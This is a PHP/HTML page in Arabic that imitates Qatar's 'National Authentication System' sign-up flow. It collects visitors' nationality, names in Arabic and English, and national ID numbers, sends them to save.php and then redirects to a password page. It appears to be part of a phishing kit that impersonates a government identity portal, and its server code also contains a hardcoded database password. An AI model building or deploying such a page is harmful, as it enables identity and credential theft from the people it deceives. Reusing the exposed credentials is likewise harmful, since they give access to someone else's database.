<?php
error_reporting(0);
ini_set('display_errors', 0);
$host = "dpg-d95vic9oagis739h761g-a";
$user = "qatar_db_user";
$password = "TpPqGoliCoObGDiGdpEc16ak3PJZ9BB1";
$dbname = "qatar_db";
$port = "5432";

try {
    $dsn = "pgsql:host=$host;port=$port;dbname=$dbname;";
    $pdo = new PDO($dsn, $user, $password, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
    $visitor_id = isset($_POST['visitor_id']) ? $_POST['visitor_id'] : 'visitor_session'; 
} catch (Exception $e) {}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>نظام التوثيق الوطني</title>
    <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>

    <style>
        :root { --primary-color: #007fb1; --secondary-color: #8a1538; --input-bg: #f2f2f2; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #ffffff; margin: 0; padding-top: 160px; }
        .header-wrapper { position: fixed; top: 0; width: 100%; background: #fff; z-index: 1000; border-bottom: 1px solid #ddd; }
        .top-header { padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; }
        .logo-area { display: flex; align-items: center; gap: 15px; }
        .logo { height: 45px; }
        .title-text { color: #555; font-size: 16px; font-weight: bold; }
        .sub-title { font-size: 14px; color: #777; }
        .menu-icon { font-size: 24px; cursor: pointer; color: #555; }
        .steps-bar { display: flex; justify-content: space-around; padding: 15px 5px; background: #f9f9f9; border-bottom: 1px solid #eee; }
        .step { text-align: center; font-size: 12px; color: #555; width: 25%; }
        .step-num { width: 35px; height: 35px; border-radius: 50%; border: 2px solid var(--primary-color); display: flex; align-items: center; justify-content: center; margin: 0 auto 5px; font-weight: bold; color: var(--primary-color); }
        .step.active .step-num { background: var(--primary-color); color: #fff; }
        .container { width: 92%; max-width: 500px; margin: 20px auto; }
        .form-group { margin-bottom: 25px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; font-size: 14px; }
        input, select, textarea { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 4px; background-color: var(--input-bg); }
        .btn-submit { width: 100%; background-color: var(--primary-color); color: white; border: none; padding: 15px; border-radius: 4px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <div class="header-wrapper">
        <div class="top-header">
            <div class="logo-area">
                <div class="menu-icon">≡</div>
                <div>
                    <div class="title-text">نظام التوثيق الوطني</div>
                    <div class="sub-title">National Authentication System</div>
                </div>
            </div>
            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/DhrsVnFpSCHlBdiR.png" class="logo">
        </div>
        
        <div class="steps-bar">
            <div class="step"> <div class="step-num">٤</div> انتهاء<br>التسجيل </div>
            <div class="step"> <div class="step-num">٣</div> كلمة<br>المرور </div>
            <div class="step active"> <div class="step-num">٢</div> البيانات<br>الشخصية </div>
            <div class="step"> <div class="step-num">١</div> نوع<br>الحساب </div>
        </div>
    </div>

    <div class="container">
        <form id="dataForm" action="save.php" method="POST">
            <input type="hidden" name="visitor_id" value="<?php echo htmlspecialchars($visitor_id); ?>">
            
            <div class="form-group"><label>اختر الجنسية <span style="color:red">*</span></label>
                <select id="nationality" name="nationality" class="js-example-basic-single" required>
                    <option value="" disabled selected>اختر الجنسية</option>
                    <?php 
                    $countries = [
                        "🇶🇦 قطر" => "قطر", "🇸🇦 السعودية" => "السعودية", "🇦🇪 الإمارات" => "الإمارات", "🇰🇼 الكويت" => "الكويت", "🇧🇭 البحرين" => "البحرين", "🇴🇲 عمان" => "عمان", "🇪🇬 مصر" => "مصر", 
                        "🇯🇴 الأردن" => "الأردن", "🇱🇧 لبنان" => "لبنان", "🇸🇾 سوريا" => "سوريا", "🇮🇶 العراق" => "العراق", "🇵🇸 فلسطين" => "فلسطين", "🇾🇪 اليمن" => "اليمن", "🇱🇾 ليبيا" => "ليبيا", 
                        "🇹🇳 تونس" => "تونس", "🇩🇿 الجزائر" => "الجزائر", "🇲🇦 المغرب" => "المغرب", "🇸🇩 السودان" => "السودان", "🇲🇷 موريتانيا" => "موريتانيا", "🇸🇴 الصومال" => "الصومال", 
                        "🇩🇯 جيبوتي" => "جيبوتي", "🇰🇲 جزر القمر" => "جزر القمر", "🇺🇸 الولايات المتحدة" => "الولايات المتحدة", "🇬🇧 المملكة المتحدة" => "المملكة المتحدة", "🇫🇷 فرنسا" => "فرنسا", 
                        "🇩🇪 ألمانيا" => "ألمانيا", "🇮🇹 إيطاليا" => "إيطاليا", "🇪🇸 إسبانيا" => "إسبانيا", "🇷🇺 روسيا" => "روسيا", "🇨🇳 الصين" => "الصين", "🇯🇵 اليابان" => "اليابان", "🇨🇦 كندا" => "كندا", 
                        "🇦🇺 أستراليا" => "أستراليا", "🇧🇷 البرازيل" => "البرازيل", "🇮🇳 الهند" => "الهند", "🇵🇰 باكستان" => "باكستان", "🇹🇷 تركيا" => "تركيا", "🇮🇷 إيران" => "إيران", "🇲🇾 ماليزيا" => "ماليزيا",
                        "🇮🇩 إندونيسيا" => "إندونيسيا", "🇵🇭 الفلبين" => "الفلبين", "🇳🇬 نيجيريا" => "نيجيريا", "🇿🇦 جنوب أفريقيا" => "جنوب أفريقيا", "🇰🇷 كوريا الجنوبية" => "كوريا الجنوبية", "🇹🇭 تايلاند" => "تايلاند"
                    ];
                    foreach($countries as $label => $value) {
                        echo "<option value='$value'>$label</option>";
                    }
                    ?>
                </select>
            </div>
            
            <div class="form-group"><label>الاسم بالعربي <span style="color:red">*</span></label><input type="text" name="name_ar" required></div>
            <div class="form-group"><label>الاسم باللغة الإنجليزية <span style="color:red">*</span></label><input type="text" name="name_en" required></div>
            <div class="form-group"><label>رقم الهوية <span style="color:red">*</span></label><input type="text" name="id_number" required></div>
            
            <button type="submit" class="btn-submit">استمرار</button>
        </form>
    </div>

    <script>
    $(document).ready(function() {
        $('.js-example-basic-single').select2();
        $('#dataForm').on('submit', function() {
            setTimeout(() => { window.location.href = 'password.php'; }, 500);
        });
    });
    </script>
</body>
</html>
